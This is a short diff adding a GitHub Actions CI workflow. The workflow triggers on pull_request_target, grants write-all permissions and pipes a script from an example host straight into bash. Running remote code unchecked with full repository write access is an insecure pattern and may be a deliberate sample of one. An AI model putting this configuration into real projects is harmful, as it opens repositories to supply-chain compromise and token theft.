@@ -1,0 +1,10 @@
+name: ci
+on: pull_request_target
+permissions: write-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bootstrap
+        run: curl -sSL https://setup.example.sh | bash
